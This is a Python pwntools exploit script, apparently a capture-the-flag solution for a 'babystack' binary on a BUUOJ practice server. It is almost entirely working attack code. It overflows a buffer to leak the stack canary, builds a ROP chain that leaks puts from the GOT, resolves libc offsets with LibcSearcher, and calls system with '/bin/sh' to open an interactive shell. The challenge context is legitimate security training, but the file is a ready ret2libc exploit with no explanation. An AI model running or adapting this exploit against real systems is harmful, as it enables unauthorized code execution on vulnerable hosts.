#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

if(sys.argv[1] == 'l'):
	p = process('./babystack')
	elf = ELF('./babystack')
else:
	p = remote('node3.buuoj.cn',29353)
	elf = ELF('./babystack')

context.log_level = 'debug'
sl = lambda x:p.sendline(x)
ru = lambda x:p.recvuntil(x)
rv = lambda x:p.recv(x)
ia = lambda :p.interactive()
g = lambda :gdb.attach(p)


pop_rdi_ret = 0x0000000000400a93
puts_got = elf.got['puts']
puts_plt = elf.symbols['puts']
main = 0x0400908

###leak canary&&libc###
ru('>> ')
payload = 'A' * (0x90-0x8)
sl('1')
sl(payload)
ru('>> ')
sl('2')
ru('A\n')
canary = u64(rv(7).rjust(8,'\x00'))
success("Canary:"+hex(canary))
#g()

payload = 'A' * 0x88 + p64(canary) + 'deadbeef' + p64(pop_rdi_ret) + p64(puts_got)
payload+= p64(puts_plt) + p64(main)
ru('>> ')
sl('1')
sl(payload)
ru('>> ')
sl('3')
puts = u64(ru('\x7f')[-6:].ljust(8,'\x00'))
success(hex(puts))

libc = LibcSearcher('puts',puts)
libc_base = puts - libc.dump('puts')
system = libc_base + libc.dump('system')
sh = libc_base + libc.dump('str_bin_sh')

###get shell###
payload = 'A' * 0x88 + p64(canary) + 'deadbeef' + p64(pop_rdi_ret) + p64(sh)
payload+= p64(system) + 'deadbeef'
ru('>> ')
sl('1')
sl(payload)
ru('>> ')
sl('3')

###get shell###
ia()
